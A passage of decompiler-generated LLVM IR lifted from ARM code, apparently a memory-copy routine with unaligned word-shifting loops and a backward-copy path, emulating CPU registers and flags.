  %v5_dbc8 = or i32 %v4_dbc8, %v3_dbc4
  store i32 %v5_dbc8, i32* %r4.global-to-local, align 4
  %v3_dbcc = udiv i32 %v5_dbbc, 256
  %v4_dbd0 = mul i32 %v8_dbbc, 16777216
  %v5_dbd0 = or i32 %v4_dbd0, %v3_dbcc
  store i32 %v5_dbd0, i32* %r5.global-to-local, align 4
  %v3_dbd4 = udiv i32 %v8_dbbc, 256
  %v4_dbd8 = mul i32 %v11_dbbc, 16777216
  %v5_dbd8 = or i32 %v4_dbd8, %v3_dbd4
  store i32 %v5_dbd8, i32* %ip.global-to-local, align 4
  %v1_dbdc = inttoptr i32 %v0_dbdc to i32*
  store i32 %v5_dbc0, i32* %v1_dbdc, align 4
  %v3_dbdc = add i32 %v0_dbdc, 4
  %v4_dbdc = inttoptr i32 %v3_dbdc to i32*
  %v5_dbdc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_dbdc, i32* %v4_dbdc, align 4
  %v6_dbdc = add i32 %v0_dbdc, 8
  %v7_dbdc = inttoptr i32 %v6_dbdc to i32*
  %v8_dbdc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_dbdc, i32* %v7_dbdc, align 4
  %v9_dbdc = add i32 %v0_dbdc, 12
  %v10_dbdc = inttoptr i32 %v9_dbdc to i32*
  %v11_dbdc = load i32, i32* %ip.global-to-local, align 4
  store i32 %v11_dbdc, i32* %v10_dbdc, align 4
  %v12_dbdc = add i32 %v0_dbdc, 16
  store i32 %v12_dbdc, i32* @r0, align 4
  %v0_dbe0 = load i32, i32* %r2.global-to-local, align 4
  %v2_dbe0 = add i32 %v0_dbe0, -16
  store i32 %v2_dbe0, i32* %r2.global-to-local, align 4
  %v6_dbe4 = icmp slt i32 %v0_dbe0, 16
  br i1 %v6_dbe4, label %dec_label_pc_dbe8, label %dec_label_pc_dbb8.dec_label_pc_dbb8_crit_edge

dec_label_pc_dbb8.dec_label_pc_dbb8_crit_edge:    ; preds = %dec_label_pc_dbb8
  %v0_dbb8.pre = load i32, i32* @lr, align 4
  %v0_dbbc.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_dbb8

dec_label_pc_dbe8:                                ; preds = %dec_label_pc_dbb8
  %v2_dbe8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_dbe8, i32* @r4, align 4
  %v5_dbe8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_dbe8, i32* @r5, align 4
  %v2_dbec = add i32 %v0_dbe0, -4
  store i32 %v2_dbec, i32* %r2.global-to-local, align 4
  %v4_dbec = add i32 %v0_dbe0, 2147483632
  %v5_dbec = and i32 %v2_dbec, %v4_dbec
  %v6_dbec = icmp slt i32 %v5_dbec, 0
  store i1 %v6_dbec, i1* %cpsr_v.global-to-local, align 1
  %v7_dbec = icmp slt i32 %v2_dbec, 0
  store i1 %v7_dbec, i1* %cpsr_n.global-to-local, align 1
  %v8_dbec = icmp eq i32 %v2_dbec, 0
  store i1 %v8_dbec, i1* %cpsr_z.global-to-local, align 1
  %v5_dbf0 = icmp slt i32 %v2_dbe0, -12
  br i1 %v5_dbf0, label %dec_label_pc_dc0c, label %dec_label_pc_dbf4

dec_label_pc_dbf4:                                ; preds = %dec_label_pc_dbe8, %dec_label_pc_dba8, %dec_label_pc_dbf4
  %v1_dc00 = phi i32 [ %v4_dc00, %dec_label_pc_dbf4 ], [ %v12_dbdc, %dec_label_pc_dbe8 ], [ %v0_dbdc74, %dec_label_pc_dba8 ]
  %v0_dbf4 = load i32, i32* @lr, align 4
  %v3_dbf4 = udiv i32 %v0_dbf4, 256
  store i32 %v3_dbf4, i32* %ip.global-to-local, align 4
  %v0_dbf8 = load i32, i32* %r1.global-to-local, align 4
  %v1_dbf8 = inttoptr i32 %v0_dbf8 to i32*
  %v2_dbf8 = load i32, i32* %v1_dbf8, align 4
  store i32 %v2_dbf8, i32* @lr, align 4
  %v4_dbf8 = add i32 %v0_dbf8, 4
  store i32 %v4_dbf8, i32* %r1.global-to-local, align 4
  %v4_dbfc = mul i32 %v2_dbf8, 16777216
  %v5_dbfc = or i32 %v4_dbfc, %v3_dbf4
  store i32 %v5_dbfc, i32* %ip.global-to-local, align 4
  %v2_dc00 = inttoptr i32 %v1_dc00 to i32*
  store i32 %v5_dbfc, i32* %v2_dc00, align 4
  %v3_dc00 = load i32, i32* @r0, align 4
  %v4_dc00 = add i32 %v3_dc00, 4
  store i32 %v4_dc00, i32* @r0, align 4
  %v0_dc04 = load i32, i32* %r2.global-to-local, align 4
  %v2_dc04 = add i32 %v0_dc04, -4
  store i32 %v2_dc04, i32* %r2.global-to-local, align 4
  %v6_dc08 = icmp slt i32 %v0_dc04, 4
  br i1 %v6_dc08, label %dec_label_pc_dc0c.loopexit, label %dec_label_pc_dbf4

dec_label_pc_dc0c.loopexit:                       ; preds = %dec_label_pc_dbf4
  %v4_dc04 = sub i32 3, %v0_dc04
  %v5_dc04 = and i32 %v4_dc04, %v0_dc04
  %v6_dc04 = icmp slt i32 %v5_dc04, 0
  %v7_dc04 = icmp slt i32 %v2_dc04, 0
  store i1 %v6_dc04, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_dc04, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_dc0c

dec_label_pc_dc0c:                                ; preds = %dec_label_pc_dc0c.loopexit, %dec_label_pc_dbe8
  %v2_db4c111 = phi i32 [ %v4_dc00, %dec_label_pc_dc0c.loopexit ], [ %v12_dbdc, %dec_label_pc_dbe8 ]
  %v0_db3c107 = phi i32 [ %v2_dc04, %dec_label_pc_dc0c.loopexit ], [ %v2_dbec, %dec_label_pc_dbe8 ]
  %v0_dc0c = load i32, i32* %r1.global-to-local, align 4
  %v1_dc0c = add i32 %v0_dc0c, -3
  store i32 %v1_dc0c, i32* @r1, align 4
  br label %bb131

dec_label_pc_dc14:                                ; preds = %dec_label_pc_db94
  br i1 %v5_dc84, label %dec_label_pc_dc60, label %dec_label_pc_dc1c

dec_label_pc_dc1c:                                ; preds = %dec_label_pc_dc14
  store i32 %v2_dc80, i32* %r2.global-to-local, align 4
  %v3_dc20 = load i32, i32* @r4, align 4
  store i32 %v3_dc20, i32* %stack_var_-16, align 4
  %v6_dc20 = load i32, i32* @r5, align 4
  store i32 %v6_dc20, i32* %stack_var_-12, align 4
  br label %dec_label_pc_dc24

dec_label_pc_dc24:                                ; preds = %dec_label_pc_dc24.dec_label_pc_dc24_crit_edge, %dec_label_pc_dc1c
  %v0_dc48 = phi i32 [ %v12_dc48, %dec_label_pc_dc24.dec_label_pc_dc24_crit_edge ], [ %v0_dbdc74, %dec_label_pc_dc1c ]
  %v0_dc28 = phi i32 [ %v0_dc28.pre, %dec_label_pc_dc24.dec_label_pc_dc24_crit_edge ], [ %v4_db98, %dec_label_pc_dc1c ]
  %v0_dc24 = phi i32 [ %v0_dc24.pre, %dec_label_pc_dc24.dec_label_pc_dc24_crit_edge ], [ %v2_db98, %dec_label_pc_dc1c ]
  %v3_dc24 = udiv i32 %v0_dc24, 65536
  store i32 %v3_dc24, i32* %r3.global-to-local, align 4
  %v1_dc28 = inttoptr i32 %v0_dc28 to i32*
  %v2_dc28 = load i32, i32* %v1_dc28, align 4
  store i32 %v2_dc28, i32* %r4.global-to-local, align 4
  %v3_dc28 = add i32 %v0_dc28, 4
  %v4_dc28 = inttoptr i32 %v3_dc28 to i32*
  %v5_dc28 = load i32, i32* %v4_dc28, align 4
  store i32 %v5_dc28, i32* %r5.global-to-local, align 4
  %v6_dc28 = add i32 %v0_dc28, 8
  %v7_dc28 = inttoptr i32 %v6_dc28 to i32*
  %v8_dc28 = load i32, i32* %v7_dc28, align 4
  store i32 %v8_dc28, i32* %ip.global-to-local, align 4
  %v9_dc28 = add i32 %v0_dc28, 12
  %v10_dc28 = inttoptr i32 %v9_dc28 to i32*
  %v11_dc28 = load i32, i32* %v10_dc28, align 4
  store i32 %v11_dc28, i32* @lr, align 4
  %v12_dc28 = add i32 %v0_dc28, 16
  store i32 %v12_dc28, i32* %r1.global-to-local, align 4
  %v4_dc2c = mul i32 %v2_dc28, 65536
  %v5_dc2c = or i32 %v4_dc2c, %v3_dc24
  store i32 %v5_dc2c, i32* %r3.global-to-local, align 4
  %v3_dc30 = udiv i32 %v2_dc28, 65536
  %v4_dc34 = mul i32 %v5_dc28, 65536
  %v5_dc34 = or i32 %v4_dc34, %v3_dc30
  store i32 %v5_dc34, i32* %r4.global-to-local, align 4
  %v3_dc38 = udiv i32 %v5_dc28, 65536
  %v4_dc3c = mul i32 %v8_dc28, 65536
  %v5_dc3c = or i32 %v4_dc3c, %v3_dc38
  store i32 %v5_dc3c, i32* %r5.global-to-local, align 4
  %v3_dc40 = udiv i32 %v8_dc28, 65536
  %v4_dc44 = mul i32 %v11_dc28, 65536
  %v5_dc44 = or i32 %v4_dc44, %v3_dc40
  store i32 %v5_dc44, i32* %ip.global-to-local, align 4
  %v1_dc48 = inttoptr i32 %v0_dc48 to i32*
  store i32 %v5_dc2c, i32* %v1_dc48, align 4
  %v3_dc48 = add i32 %v0_dc48, 4
  %v4_dc48 = inttoptr i32 %v3_dc48 to i32*
  %v5_dc48 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_dc48, i32* %v4_dc48, align 4
  %v6_dc48 = add i32 %v0_dc48, 8
  %v7_dc48 = inttoptr i32 %v6_dc48 to i32*
  %v8_dc48 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_dc48, i32* %v7_dc48, align 4
  %v9_dc48 = add i32 %v0_dc48, 12
  %v10_dc48 = inttoptr i32 %v9_dc48 to i32*
  %v11_dc48 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v11_dc48, i32* %v10_dc48, align 4
  %v12_dc48 = add i32 %v0_dc48, 16
  store i32 %v12_dc48, i32* @r0, align 4
  %v0_dc4c = load i32, i32* %r2.global-to-local, align 4
  %v2_dc4c = add i32 %v0_dc4c, -16
  store i32 %v2_dc4c, i32* %r2.global-to-local, align 4
  %v6_dc50 = icmp slt i32 %v0_dc4c, 16
  br i1 %v6_dc50, label %dec_label_pc_dc54, label %dec_label_pc_dc24.dec_label_pc_dc24_crit_edge

dec_label_pc_dc24.dec_label_pc_dc24_crit_edge:    ; preds = %dec_label_pc_dc24
  %v0_dc24.pre = load i32, i32* @lr, align 4
  %v0_dc28.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_dc24

dec_label_pc_dc54:                                ; preds = %dec_label_pc_dc24
  %v2_dc54 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_dc54, i32* @r4, align 4
  %v5_dc54 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_dc54, i32* @r5, align 4
  %v2_dc58 = add i32 %v0_dc4c, -4
  store i32 %v2_dc58, i32* %r2.global-to-local, align 4
  %v4_dc58 = add i32 %v0_dc4c, 2147483632
  %v5_dc58 = and i32 %v2_dc58, %v4_dc58
  %v6_dc58 = icmp slt i32 %v5_dc58, 0
  store i1 %v6_dc58, i1* %cpsr_v.global-to-local, align 1
  %v7_dc58 = icmp slt i32 %v2_dc58, 0
  store i1 %v7_dc58, i1* %cpsr_n.global-to-local, align 1
  %v8_dc58 = icmp eq i32 %v2_dc58, 0
  store i1 %v8_dc58, i1* %cpsr_z.global-to-local, align 1
  %v5_dc5c = icmp slt i32 %v2_dc4c, -12
  br i1 %v5_dc5c, label %dec_label_pc_dc78, label %dec_label_pc_dc60

dec_label_pc_dc60:                                ; preds = %dec_label_pc_dc54, %dec_label_pc_dc14, %dec_label_pc_dc60
  %v1_dc6c = phi i32 [ %v4_dc6c, %dec_label_pc_dc60 ], [ %v12_dc48, %dec_label_pc_dc54 ], [ %v0_dbdc74, %dec_label_pc_dc14 ]
  %v0_dc60 = load i32, i32* @lr, align 4
  %v3_dc60 = udiv i32 %v0_dc60, 65536
  store i32 %v3_dc60, i32* %ip.global-to-local, align 4
  %v0_dc64 = load i32, i32* %r1.global-to-local, align 4
  %v1_dc64 = inttoptr i32 %v0_dc64 to i32*
  %v2_dc64 = load i32, i32* %v1_dc64, align 4
  store i32 %v2_dc64, i32* @lr, align 4
  %v4_dc64 = add i32 %v0_dc64, 4
  store i32 %v4_dc64, i32* %r1.global-to-local, align 4
  %v4_dc68 = mul i32 %v2_dc64, 65536
  %v5_dc68 = or i32 %v4_dc68, %v3_dc60
  store i32 %v5_dc68, i32* %ip.global-to-local, align 4
  %v2_dc6c = inttoptr i32 %v1_dc6c to i32*
  store i32 %v5_dc68, i32* %v2_dc6c, align 4
  %v3_dc6c = load i32, i32* @r0, align 4
  %v4_dc6c = add i32 %v3_dc6c, 4
  store i32 %v4_dc6c, i32* @r0, align 4
  %v0_dc70 = load i32, i32* %r2.global-to-local, align 4
  %v2_dc70 = add i32 %v0_dc70, -4
  store i32 %v2_dc70, i32* %r2.global-to-local, align 4
  %v6_dc74 = icmp slt i32 %v0_dc70, 4
  br i1 %v6_dc74, label %dec_label_pc_dc78.loopexit, label %dec_label_pc_dc60

dec_label_pc_dc78.loopexit:                       ; preds = %dec_label_pc_dc60
  %v4_dc70 = sub i32 3, %v0_dc70
  %v5_dc70 = and i32 %v4_dc70, %v0_dc70
  %v6_dc70 = icmp slt i32 %v5_dc70, 0
  %v7_dc70 = icmp slt i32 %v2_dc70, 0
  store i1 %v6_dc70, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_dc70, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_dc78

dec_label_pc_dc78:                                ; preds = %dec_label_pc_dc78.loopexit, %dec_label_pc_dc54
  %v2_db4c112 = phi i32 [ %v4_dc6c, %dec_label_pc_dc78.loopexit ], [ %v12_dc48, %dec_label_pc_dc54 ]
  %v0_db3c108 = phi i32 [ %v2_dc70, %dec_label_pc_dc78.loopexit ], [ %v2_dc58, %dec_label_pc_dc54 ]
  %v0_dc78 = load i32, i32* %r1.global-to-local, align 4
  %v1_dc78 = add i32 %v0_dc78, -2
  store i32 %v1_dc78, i32* @r1, align 4
  br label %bb131

dec_label_pc_dc80:                                ; preds = %dec_label_pc_db94
  br i1 %v5_dc84, label %dec_label_pc_dccc, label %dec_label_pc_dc88

dec_label_pc_dc88:                                ; preds = %dec_label_pc_dc80
  store i32 %v2_dc80, i32* %r2.global-to-local, align 4
  %v3_dc8c = load i32, i32* @r4, align 4
  store i32 %v3_dc8c, i32* %stack_var_-16, align 4
  %v6_dc8c = load i32, i32* @r5, align 4
  store i32 %v6_dc8c, i32* %stack_var_-12, align 4
  br label %dec_label_pc_dc90

dec_label_pc_dc90:                                ; preds = %dec_label_pc_dc90.dec_label_pc_dc90_crit_edge, %dec_label_pc_dc88
  %v0_dcb4 = phi i32 [ %v12_dcb4, %dec_label_pc_dc90.dec_label_pc_dc90_crit_edge ], [ %v0_dbdc74, %dec_label_pc_dc88 ]
  %v0_dc94 = phi i32 [ %v0_dc94.pre, %dec_label_pc_dc90.dec_label_pc_dc90_crit_edge ], [ %v4_db98, %dec_label_pc_dc88 ]
  %v0_dc90 = phi i32 [ %v0_dc90.pre, %dec_label_pc_dc90.dec_label_pc_dc90_crit_edge ], [ %v2_db98, %dec_label_pc_dc88 ]
  %v3_dc90 = udiv i32 %v0_dc90, 16777216
  store i32 %v3_dc90, i32* %r3.global-to-local, align 4
  %v1_dc94 = inttoptr i32 %v0_dc94 to i32*
  %v2_dc94 = load i32, i32* %v1_dc94, align 4
  store i32 %v2_dc94, i32* %r4.global-to-local, align 4
  %v3_dc94 = add i32 %v0_dc94, 4
  %v4_dc94 = inttoptr i32 %v3_dc94 to i32*
  %v5_dc94 = load i32, i32* %v4_dc94, align 4
  store i32 %v5_dc94, i32* %r5.global-to-local, align 4
  %v6_dc94 = add i32 %v0_dc94, 8
  %v7_dc94 = inttoptr i32 %v6_dc94 to i32*
  %v8_dc94 = load i32, i32* %v7_dc94, align 4
  store i32 %v8_dc94, i32* %ip.global-to-local, align 4
  %v9_dc94 = add i32 %v0_dc94, 12
  %v10_dc94 = inttoptr i32 %v9_dc94 to i32*
  %v11_dc94 = load i32, i32* %v10_dc94, align 4
  store i32 %v11_dc94, i32* @lr, align 4
  %v12_dc94 = add i32 %v0_dc94, 16
  store i32 %v12_dc94, i32* %r1.global-to-local, align 4
  %v4_dc98 = mul i32 %v2_dc94, 256
  %v5_dc98 = or i32 %v4_dc98, %v3_dc90
  store i32 %v5_dc98, i32* %r3.global-to-local, align 4
  %v3_dc9c = udiv i32 %v2_dc94, 16777216
  %v4_dca0 = mul i32 %v5_dc94, 256
  %v5_dca0 = or i32 %v4_dca0, %v3_dc9c
  store i32 %v5_dca0, i32* %r4.global-to-local, align 4
  %v3_dca4 = udiv i32 %v5_dc94, 16777216
  %v4_dca8 = mul i32 %v8_dc94, 256
  %v5_dca8 = or i32 %v4_dca8, %v3_dca4
  store i32 %v5_dca8, i32* %r5.global-to-local, align 4
  %v3_dcac = udiv i32 %v8_dc94, 16777216
  %v4_dcb0 = mul i32 %v11_dc94, 256
  %v5_dcb0 = or i32 %v4_dcb0, %v3_dcac
  store i32 %v5_dcb0, i32* %ip.global-to-local, align 4
  %v1_dcb4 = inttoptr i32 %v0_dcb4 to i32*
  store i32 %v5_dc98, i32* %v1_dcb4, align 4
  %v3_dcb4 = add i32 %v0_dcb4, 4
  %v4_dcb4 = inttoptr i32 %v3_dcb4 to i32*
  %v5_dcb4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_dcb4, i32* %v4_dcb4, align 4
  %v6_dcb4 = add i32 %v0_dcb4, 8
  %v7_dcb4 = inttoptr i32 %v6_dcb4 to i32*
  %v8_dcb4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_dcb4, i32* %v7_dcb4, align 4
  %v9_dcb4 = add i32 %v0_dcb4, 12
  %v10_dcb4 = inttoptr i32 %v9_dcb4 to i32*
  %v11_dcb4 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v11_dcb4, i32* %v10_dcb4, align 4
  %v12_dcb4 = add i32 %v0_dcb4, 16
  store i32 %v12_dcb4, i32* @r0, align 4
  %v0_dcb8 = load i32, i32* %r2.global-to-local, align 4
  %v2_dcb8 = add i32 %v0_dcb8, -16
  store i32 %v2_dcb8, i32* %r2.global-to-local, align 4
  %v6_dcbc = icmp slt i32 %v0_dcb8, 16
  br i1 %v6_dcbc, label %dec_label_pc_dcc0, label %dec_label_pc_dc90.dec_label_pc_dc90_crit_edge

dec_label_pc_dc90.dec_label_pc_dc90_crit_edge:    ; preds = %dec_label_pc_dc90
  %v0_dc90.pre = load i32, i32* @lr, align 4
  %v0_dc94.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_dc90

dec_label_pc_dcc0:                                ; preds = %dec_label_pc_dc90
  %v2_dcc0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_dcc0, i32* @r4, align 4
  %v5_dcc0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_dcc0, i32* @r5, align 4
  %v2_dcc4 = add i32 %v0_dcb8, -4
  store i32 %v2_dcc4, i32* %r2.global-to-local, align 4
  %v4_dcc4 = add i32 %v0_dcb8, 2147483632
  %v5_dcc4 = and i32 %v2_dcc4, %v4_dcc4
  %v6_dcc4 = icmp slt i32 %v5_dcc4, 0
  store i1 %v6_dcc4, i1* %cpsr_v.global-to-local, align 1
  %v7_dcc4 = icmp slt i32 %v2_dcc4, 0
  store i1 %v7_dcc4, i1* %cpsr_n.global-to-local, align 1
  %v8_dcc4 = icmp eq i32 %v2_dcc4, 0
  store i1 %v8_dcc4, i1* %cpsr_z.global-to-local, align 1
  %v5_dcc8 = icmp slt i32 %v2_dcb8, -12
  br i1 %v5_dcc8, label %dec_label_pc_dce4, label %dec_label_pc_dccc

dec_label_pc_dccc:                                ; preds = %dec_label_pc_dcc0, %dec_label_pc_dc80, %dec_label_pc_dccc
  %v1_dcd8 = phi i32 [ %v4_dcd8, %dec_label_pc_dccc ], [ %v12_dcb4, %dec_label_pc_dcc0 ], [ %v0_dbdc74, %dec_label_pc_dc80 ]
  %v0_dccc = load i32, i32* @lr, align 4
  %v3_dccc = udiv i32 %v0_dccc, 16777216
  store i32 %v3_dccc, i32* %ip.global-to-local, align 4
  %v0_dcd0 = load i32, i32* %r1.global-to-local, align 4
  %v1_dcd0 = inttoptr i32 %v0_dcd0 to i32*
  %v2_dcd0 = load i32, i32* %v1_dcd0, align 4
  store i32 %v2_dcd0, i32* @lr, align 4
  %v4_dcd0 = add i32 %v0_dcd0, 4
  store i32 %v4_dcd0, i32* %r1.global-to-local, align 4
  %v4_dcd4 = mul i32 %v2_dcd0, 256
  %v5_dcd4 = or i32 %v4_dcd4, %v3_dccc
  store i32 %v5_dcd4, i32* %ip.global-to-local, align 4
  %v2_dcd8 = inttoptr i32 %v1_dcd8 to i32*
  store i32 %v5_dcd4, i32* %v2_dcd8, align 4
  %v3_dcd8 = load i32, i32* @r0, align 4
  %v4_dcd8 = add i32 %v3_dcd8, 4
  store i32 %v4_dcd8, i32* @r0, align 4
  %v0_dcdc = load i32, i32* %r2.global-to-local, align 4
  %v2_dcdc = add i32 %v0_dcdc, -4
  store i32 %v2_dcdc, i32* %r2.global-to-local, align 4
  %v6_dce0 = icmp slt i32 %v0_dcdc, 4
  br i1 %v6_dce0, label %dec_label_pc_dce4.loopexit, label %dec_label_pc_dccc

dec_label_pc_dce4.loopexit:                       ; preds = %dec_label_pc_dccc
  %v4_dcdc = sub i32 3, %v0_dcdc
  %v5_dcdc = and i32 %v4_dcdc, %v0_dcdc
  %v6_dcdc = icmp slt i32 %v5_dcdc, 0
  %v7_dcdc = icmp slt i32 %v2_dcdc, 0
  store i1 %v6_dcdc, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_dcdc, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_dce4

dec_label_pc_dce4:                                ; preds = %dec_label_pc_dce4.loopexit, %dec_label_pc_dcc0
  %v2_db4c113 = phi i32 [ %v4_dcd8, %dec_label_pc_dce4.loopexit ], [ %v12_dcb4, %dec_label_pc_dcc0 ]
  %v0_db3c109 = phi i32 [ %v2_dcdc, %dec_label_pc_dce4.loopexit ], [ %v2_dcc4, %dec_label_pc_dcc0 ]
  %v0_dce4 = load i32, i32* %r1.global-to-local, align 4
  %v1_dce4 = add i32 %v0_dce4, -1
  store i32 %v1_dce4, i32* @r1, align 4
  br label %bb131

dec_label_pc_dcec:                                ; preds = %dec_label_pc_daa0
  %v1_dcec = load i32, i32* @r2, align 4
  %v2_dcec = add i32 %v1_dcec, %v0_daa0
  store i32 %v2_dcec, i32* %r1.global-to-local, align 4
  %v2_dcf0 = add i32 %v1_dcec, %v1_daa0
  store i32 %v2_dcf0, i32* %r0.global-to-local, align 4
  %v2_dcf4 = add i32 %v1_dcec, -4
  store i32 %v2_dcf4, i32* %r2.global-to-local, align 4
  %v4_dcf4 = sub i32 3, %v1_dcec
  %v5_dcf4 = and i32 %v4_dcf4, %v1_dcec
  %v6_dcf4 = icmp slt i32 %v5_dcf4, 0
  store i1 %v6_dcf4, i1* %cpsr_v.global-to-local, align 1
  %v7_dcf4 = icmp slt i32 %v2_dcf4, 0
  store i1 %v7_dcf4, i1* %cpsr_n.global-to-local, align 1
  %v8_dcf4 = icmp eq i32 %v1_dcec, 4
  store i1 %v8_dcf4, i1* %cpsr_z.global-to-local, align 1
  %v5_dcf8 = icmp slt i32 %v1_dcec, 4
  br i1 %v5_dcf8, label %bb141, label %dec_label_pc_dcfc

dec_label_pc_dcfc:                                ; preds = %dec_label_pc_dcec
  %v1_dcfc = urem i32 %v2_dcf0, 4
  store i32 %v1_dcfc, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_dcfc = icmp eq i32 %v1_dcfc, 0
  store i1 %v2_dcfc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_dcfc, label %dec_label_pc_dd04, label %dec_label_pc_dda4

dec_label_pc_dd04:                                ; preds = %dec_label_pc_dcfc
  %v1_dd04 = urem i32 %v2_dcec, 4
  store i32 %v1_dd04, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_dd04 = icmp eq i32 %v1_dd04, 0
  store i1 %v2_dd04, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_dd04, label %dec_label_pc_dd0c, label %dec_label_pc_ddd0

dec_label_pc_dd0c:                                ; preds = %dec_label_pc_dd04, %dec_label_pc_ddc8
  %v0_dd2448 = phi i32 [ %v2_dcf0, %dec_label_pc_dd04 ], [ %v0_de1831, %dec_label_pc_ddc8 ]
  %v0_dd2047 = phi i32 [ %v2_dcec, %dec_label_pc_dd04 ], [ %v0_ddc8, %dec_label_pc_ddc8 ]
  %v0_dd0c = phi i32 [ %v2_dcf4, %dec_label_pc_dd04 ], [ %v2_ddc0, %dec_label_pc_ddc8 ]
  %v2_dd0c = add i32 %v0_dd0c, -8
  store i32 %v2_dd0c, i32* %r2.global-to-local, align 4
  %v4_dd0c = sub i32 7, %v0_dd0c
  %v5_dd0c = and i32 %v4_dd0c, %v0_dd0c
  %v6_dd0c = icmp slt i32 %v5_dd0c, 0
  store i1 %v6_dd0c, i1* %cpsr_v.global-to-local, align 1
  %v7_dd0c = icmp slt i32 %v2_dd0c, 0
  store i1 %v7_dd0c, i1* %cpsr_n.global-to-local, align 1
  %v8_dd0c = icmp eq i32 %v0_dd0c, 8
  store i1 %v8_dd0c, i1* %cpsr_z.global-to-local, align 1
  %v5_dd10 = icmp slt i32 %v0_dd0c, 8
  br i1 %v5_dd10, label %dec_label_pc_dd5c, label %dec_label_pc_dd14

dec_label_pc_dd14:                                ; preds = %dec_label_pc_dd0c
  %v3_dd14 = load i32, i32* @r4, align 4
  store i32 %v3_dd14, i32* %stack_var_-8, align 4
  %v6_dd14 = load i32, i32* @lr, align 4
  %v2_dd18 = add i32 %v0_dd0c, -28
  store i32 %v2_dd18, i32* %r2.global-to-local, align 4
  %v4_dd18 = sub i32 27, %v0_dd0c
  %v5_dd18 = and i32 %v4_dd18, %v2_dd0c
  %v6_dd18 = icmp slt i32 %v5_dd18, 0
  store i1 %v6_dd18, i1* %cpsr_v.global-to-local, align 1
  %v7_dd18 = icmp slt i32 %v2_dd18, 0
  store i1 %v7_dd18, i1* %cpsr_n.global-to-local, align 1
  %v8_dd18 = icmp eq i32 %v2_dd0c, 20
  store i1 %v8_dd18, i1* %cpsr_z.global-to-local, align 1
  %v5_dd1c = icmp slt i32 %v2_dd0c, 20
  br i1 %v5_dd1c, label %dec_label_pc_dd38, label %dec_label_pc_dd20

dec_label_pc_dd20:                                ; preds = %dec_label_pc_dd14, %dec_label_pc_dd20.dec_label_pc_dd20_crit_edge
  %v0_dd24 = phi i32 [ %v1_dd2c, %dec_label_pc_dd20.dec_label_pc_dd20_crit_edge ], [ %v0_dd2448, %dec_label_pc_dd14 ]
  %v0_dd20 = phi i32 [ %v0_dd20.pre, %dec_label_pc_dd20.dec_label_pc_dd20_crit_edge ], [ %v0_dd2047, %dec_label_pc_dd14 ]
  %v1_dd20 = add i32 %v0_dd20, -4
  %v2_dd20 = inttoptr i32 %v1_dd20 to i32*
  %v3_dd20 = load i32, i32* %v2_dd20, align 4
  store i32 %v3_dd20, i32* %r3.global-to-local, align 4
  %v4_dd20 = add i32 %v0_dd20, -8
  %v5_dd20 = inttoptr i32 %v4_dd20 to i32*
  %v6_dd20 = load i32, i32* %v5_dd20, align 4
  store i32 %v6_dd20, i32* %r4.global-to-local, align 4
  %v7_dd20 = add i32 %v0_dd20, -12
  %v8_dd20 = inttoptr i32 %v7_dd20 to i32*
  %v9_dd20 = load i32, i32* %v8_dd20, align 4
  store i32 %v9_dd20, i32* %ip.global-to-local, align 4
  %v10_dd20 = add i32 %v0_dd20, -16
  %v11_dd20 = inttoptr i32 %v10_dd20 to i32*
  %v12_dd20 = load i32, i32* %v11_dd20, align 4
  store i32 %v12_dd20, i32* %lr.global-to-local, align 4
  store i32 %v10_dd20, i32* %r1.global-to-local, align 4
  %v1_dd24 = add i32 %v0_dd24, -16
  %v2_dd24 = inttoptr i32 %v1_dd24 to i32*
  store i32 %v3_dd20, i32* %v2_dd24, align 4
  %v4_dd24 = add i32 %v0_dd24, -12
  %v5_dd24 = inttoptr i32 %v4_dd24 to i32*
  %v6_dd24 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_dd24, i32* %v5_dd24, align 4
  %v7_dd24 = add i32 %v0_dd24, -8
  %v8_dd24 = inttoptr i32 %v7_dd24 to i32*
  %v9_dd24 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_dd24, i32* %v8_dd24, align 4
  %v10_dd24 = add i32 %v0_dd24, -4
  %v11_dd24 = inttoptr i32 %v10_dd24 to i32*
  %v12_dd24 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_dd24, i32* %v11_dd24, align 4
  store i32 %v1_dd24, i32* %r0.global-to-local, align 4
  %v0_dd28 = load i32, i32* %r1.global-to-local, align 4
  %v1_dd28 = add i32 %v0_dd28, -4
  %v2_dd28 = inttoptr i32 %v1_dd28 to i32*
  %v3_dd28 = load i32, i32* %v2_dd28, align 4
  store i32 %v3_dd28, i32* %r3.global-to-local, align 4
  %v4_dd28 = add i32 %v0_dd28, -8
  %v5_dd28 = inttoptr i32 %v4_dd28 to i32*
  %v6_dd28 = load i32, i32* %v5_dd28, align 4
  store i32 %v6_dd28, i32* %r4.global-to-local, align 4
  %v7_dd28 = add i32 %v0_dd28, -12
